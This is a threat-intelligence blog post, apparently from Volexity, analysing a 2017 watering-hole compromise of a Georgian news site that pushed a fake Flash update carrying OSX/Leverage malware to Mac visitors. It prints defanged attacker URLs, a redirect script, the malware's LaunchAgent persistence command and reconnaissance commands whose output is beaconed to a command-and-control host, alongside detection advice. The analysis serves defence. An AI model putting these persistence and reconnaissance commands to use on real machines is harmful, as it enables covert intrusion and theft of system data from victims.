				<h2 class="post-title">Real News, Fake Flash: Mac OS X Users Targeted</h2>
				<p class="post-date">July 24, 2017</p>
									<p class="post-byline">by Volexity</p>
					
				<div class="post-single-social">
		      <a class="post-single-social-share" data-share-channel="facebook" data-title="Real News, Fake Flash: Mac OS X Users Targeted" data-description="Volexity recently identified a breach to the website of a well regarded media outlet in the country of Georgia. The following JavaScript code was observed on the index page of the Georgian language portion of the website. The attackers appear to have implemented multiple checks to make sure they limited the targeting and [&hellip;]" data-url="https://www.volexity.com/blog/2017/07/24/real-news-fake-flash-mac-os-x-users-targeted/" data-image="" data-caption="Volexity"><i class="icon icon-facebook-share"></i><span class="sr-only">Facebook</span></a>
		      <a class="post-single-social-share" data-share-channel="twitter" data-text="Real+News%2C+Fake+Flash%3A+Mac+OS+X+Users+Targeted" data-url="https://www.volexity.com/blog/2017/07/24/real-news-fake-flash-mac-os-x-users-targeted/" data-hashtags="volexity" data-via="Volexity"><i class="icon icon-twitter-share"></i><span class="sr-only">Twitter</span></a>
		      <a class="post-single-social-share" data-share-channel="email" data-post-id="803"><i class="icon icon-mail-share"></i><span class="sr-only">Email</span></a>
			  </div>
				<p>Volexity recently identified a breach to the website of a well regarded media outlet in the country of Georgia. As part of this breach, the media organization's website was being leveraged as a component of a malware campaign targeting select visitors. The news organization provides reporting on its website in English, Georgian, and Russian. However, only the Georgian language portion of the website was impacted and used in an effort to distribute malware. The targets were then further narrowed to those that were running the <span style="color: #3366ff;"><strong>Mac OS X</strong> </span>operating system, had not previously visited the website, and had specific browser versions. The attackers accomplished much of this with JavaScript they placed on the media organization's website.</p>
<p>The following JavaScript code was observed on the index page of the Georgian language portion of the website.</p>
<p><img fetchpriority="high" decoding="async" class="aligncenter wp-image-805" src="https://www.volexity.com/wp-content/uploads/2017/07/ge-javascript-1024x554.png" alt="" width="656" height="355" srcset="https://www.volexity.com/wp-content/uploads/2017/07/ge-javascript-1024x554.png 1024w, https://www.volexity.com/wp-content/uploads/2017/07/ge-javascript-300x162.png 300w, https://www.volexity.com/wp-content/uploads/2017/07/ge-javascript-768x415.png 768w, https://www.volexity.com/wp-content/uploads/2017/07/ge-javascript.png 1374w" sizes="(max-width: 656px) 100vw, 656px" /></p>
<p>The attackers appear to have implemented multiple checks to make sure they limited the targeting and frequency of the attacks against visitors to the website. In particular, the JavaScript specifically checks if the vistor's User-Agent is associated with a Mac and that the browser is not Google Chrome. If these conditions pass, cookies for the website are pulled into a variable and inspected. In particular a cookie named <strong>site</strong> is examined to see if it holds the value <strong>RNDsstr2Template2</strong> or <strong>RNDsstrTemplate</strong>. If either cookie is present, it indicates that the visitor has previously visited the website and evaluated the attacker's JavaScript code. If this is the case, the exploitation chain will end. The code will then extend the expiration of the <strong>site</strong> cookie with  <strong>RNDsstr2Template2 </strong>as its value. However, if initial criteria passed and the <strong>site</strong> cookie is not present or at least does not contain the value <strong>RNDsstr2Template2</strong> or <strong>RNDsstrTemplate</strong>, the JavaScript will then create the <strong>site </strong>cookie with the value <strong>RNDsstrTemplate</strong> and then call the function <strong>prepareFrame()</strong>.</p>
<p>The <strong>prepareFrame()</strong> function effectively loads an iframe from the following attacker controlled URL:</p>
<blockquote><p><span class="end-tag"><a class="unlinked">http://updatesec.webredirect[.]org/flash/index.php</a></span></p></blockquote>
<p>During most of Volexity's test cases, this page will only return 2 bytes back to the request. However, when requesting the URL with a User-Agent indicative of a Mac system using Safari, Volexity was able to intermittently get the the website to return follow on JavaScript. Despite the initial check ensuring the visitor is on a Mac and not running Google Chrome, it appears server-side code performs further checks before attempting to actually target the user. Volexity observed the following code being returned from the server upon meeting all targeting conditions:</p>
<blockquote><p>&lt;script type='text/javascript'&gt;</p>
<p>window.parent.location.href= '<a class="unlinked">http://updatesec.webredirect[.]org/flashplayer/index.html';</a></p>
<p>&lt;/script&gt;</p></blockquote>
<p>This script results in the user being brought to a page titled "<strong>Flash Player Critical Update</strong>" that was designed to appear as though it was a legitimate Adobe website. This page in turn loaded an iframe from the following URL:</p>
<blockquote><p><span class="end-tag"><a class="unlinked">http://updatesec.webredirect[.]org/flash.html</a></span></p></blockquote>
<p>The code from this URL appears to have been generated from Metasploit with a module for the Safari User-Assisted Download and Run Attack. The <a class="jive-link-external-small" href="https://portal.volexity.com/external-link.jspa?url=https%3A%2F%2Fwww.rapid7.com%2Fdb%2Fmodules%2Fexploit%2Fosx%2Fbrowser%2Fsafari_user_assisted_download_launch" target="_blank" rel="nofollow noopener noreferrer">Metasploit website</a> describes the attack and the module as follows:</p>
<blockquote class="jive-quote"><p>This module abuses some Safari functionality to force the download of a zipped .app OSX application containing our payload. The app is then invoked using a custom URL scheme. At this point, the user is presented with Gatekeeper's prompt: "APP_NAME" is an application downloaded from the internet. Are you sure you want to open it? If the user clicks "Open", the app and its payload are executed. If the user has the "Only allow applications downloaded from Mac App Store and identified developers (on by default on OS 10.8+), the user will see an error dialog containing "can't be opened because it is from an unidentified developer." To work around this issue, you will need to manually build and sign an OSX app containing your payload with a custom URL handler called "openurl". You can put newlines and unicode in your APP_NAME, although you must be careful not to create a prompt that is too tall, or the user will not be able to click the buttons, and will have to either logout or kill the CoreServicesUIAgent process.</p></blockquote>
<p>The code in this case would attempt to download and install malware from the following URL:</p>
<blockquote><p><span class="end-tag"><a class="unlinked">http://updatesec.webredirect[.]org/GetFlashPlayer.zip </a></span></p></blockquote>
<p>The User-Assisted Download and Run would then result in the creation of the file (directory) <strong>GetFlashPlayer.app</strong> and its attempted launch from the user's Downloads directory. Per the description above, OS X will then prompt the user if they are sure they wish to run the file since it was downloaded from the Internet.</p>
<p><img decoding="async" class="aligncenter wp-image-822" src="https://www.volexity.com/wp-content/uploads/2017/07/GetFlashPlayer-autoexec.png" alt="GetFlashPlayer Execution" width="652" height="494" srcset="https://www.volexity.com/wp-content/uploads/2017/07/GetFlashPlayer-autoexec.png 741w, https://www.volexity.com/wp-content/uploads/2017/07/GetFlashPlayer-autoexec-300x228.png 300w" sizes="(max-width: 652px) 100vw, 652px" /><br />
If the user selects "Open" or otherwise later launches it from their Download folder, the malware will be launched and install a copy of itself at the following path:</p>
<blockquote class="jive-quote"><p><strong>/Users/&lt;username&gt;/Library/Safari/GetFlashPlayer.app/</strong></p></blockquote>
<p>The folder structure of the malware and its files is shown below.</p>
<p><img decoding="async" class="aligncenter wp-image-824" src="https://www.volexity.com/wp-content/uploads/2017/07/GetFlashPlayer-Folders.png" alt="OSX/Leverage Folder Structure" width="687" height="268" srcset="https://www.volexity.com/wp-content/uploads/2017/07/GetFlashPlayer-Folders.png 782w, https://www.volexity.com/wp-content/uploads/2017/07/GetFlashPlayer-Folders-300x117.png 300w, https://www.volexity.com/wp-content/uploads/2017/07/GetFlashPlayer-Folders-768x300.png 768w" sizes="(max-width: 687px) 100vw, 687px" /></p>
<p>The malware maintains persistence through a Launch Agent by executing the following commands:</p>
<blockquote class="jive-quote"><p><strong>mkdir ~/Library/LaunchAgents</strong></p>
<p><strong>echo '&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;&lt;plist version="1.0"&gt;&lt;dict&gt;&lt;key&gt;RunAtLoad&lt;/key&gt;&lt;true/&gt;&lt;key&gt;KeepAlive&lt;/key&gt;&lt;true/&gt;&lt;key&gt;Label&lt;/key&gt;&lt;string&gt;com.GetFlashPlayer&lt;/string&gt;&lt;key&gt;ProgramArguments&lt;/key&gt;&lt;array&gt;&lt;string&gt;/Users/&lt;username&gt;/Library/Safari/GetFlashPlayer.app/Contents/MacOS/GetFlashPlayer&lt;/string&gt;&lt;/array&gt;&lt;/dict&gt;&lt;/plist&gt;' &gt; ~/Library/LaunchAgents/com.GetFlashPlayer.plist</strong></p></blockquote>
<p>As can be seen, the malware is writing a plist file named <strong>com.GetFlashPlayer.plist</strong> into the victim user's LaunchAgent directory.<br />
The<em> RunAtLoad</em> and <em>KeepAlive</em> keys ensure that the malware will gain persistence and keep running.</p>
<p>Upon execution, the malware will also use the <em>open</em> command to launch the URL https://get.adobe.com/flashplayer/ in a browser window. This new browser activity is meant to trick the user into thinking the Adobe Flash Update application is legitimate. The malware then immediately begins to beacon to <strong>downloadarchives.servehttp[.]com</strong> (213.200.14.138) on TCP port <strong>7777</strong>. If a successful connection is made, the output from the following commands is sent:</p>
<ol>
<li>logname</li>
<li>ioreg -l | grep "product-name" | awk -F'\' '{print $4}'</li>
<li>sw_vers | awk -F':\t' '{print $2}' | paste -d ' ' - - -;</li>
<li>sysctl -n hw.memsize | awk '{print $0/1073741824" GB RAM"}';</li>
<li>df -hl | grep 'disk0s2' | awk '{print $4"/"$2" free ("$5" used)"}'</li>
<li>ioreg -l | grep "IOPlatformSerialNumber" | awk -F'' '{print $4}'</li>
</ol>

<p>The backdoor is very noisy and will attempt to communicate with the command and control server every second until a connection is established.</p>
<h2>Malware File Information</h2>
<p>The malware used by the attackers appears to be a newer version of what has previously been dubbed OSX/Leverage.A and described in public blogs by <a class="jive-link-external-small" href="https://portal.volexity.com/external-link.jspa?url=https%3A%2F%2Fwww.intego.com%2Fmac-security-blog%2Ftopic%2Fosxleverage-a%2F" target="_blank" rel="nofollow noopener noreferrer">Intego</a> and <a class="jive-link-external-small" href="https://portal.volexity.com/external-link.jspa?url=https%3A%2F%2Fwww.alienvault.com%2Fblogs%2Flabs-research%2Fosx-leveragea-analysis" target="_blank" rel="nofollow noopener noreferrer">AlienVault</a>. It is written in Real Basic and beacons back to the attackers once per second until a connection is established. Unlike the earlier version of the malware, this new version does not limit itself to a predefined set of commands and instead allows an unrestricted command shell capability back into an infected system. Details of the core malware files are provided below.</p>

<h2>Detection</h2>
<p>Detection of the malware can be achieved both from the host and network level. On the host, systems can be examined for the presence of the <strong>GetFlashPlayer</strong> application and/or Launch Agency under a user's profile. Additionally, any files found to be signed with the certificate described above should be considered to be malicious. At the network level, connections destined for TCP port 7777 should be scrutinized and examined, as this is a non-standard port for typical external communication. The following Emerging Threats rule, found under trojan.rules, will also detect the network beacons:</p>
<blockquote><p>2017525 - ET TROJAN OSX/Leverage.A Checkin</p></blockquote>

<h2>[Un]Related Activity</h2>
<p>In a final interesting twist, while writing this blog, Volexity noted that the IP address for the hostname <strong>updatesec.webredirect[.]org</strong> was updated to resolve to the Lithuanian IP address <strong>185.28.22.22</strong>. This IP address does not appear to be responding on port 80, so no content would be served to visitors. However, it should be noted that this IP address is listed as a command and control server in the <a href="https://www.welivesecurity.com/2017/07/20/stantinko-massive-adware-campaign-operating-covertly-since-2012/">Stantinko report</a> that was just released by ESET last week. Volexity is not aware of any ties between this threat activity and those behind Stantinko.</p>
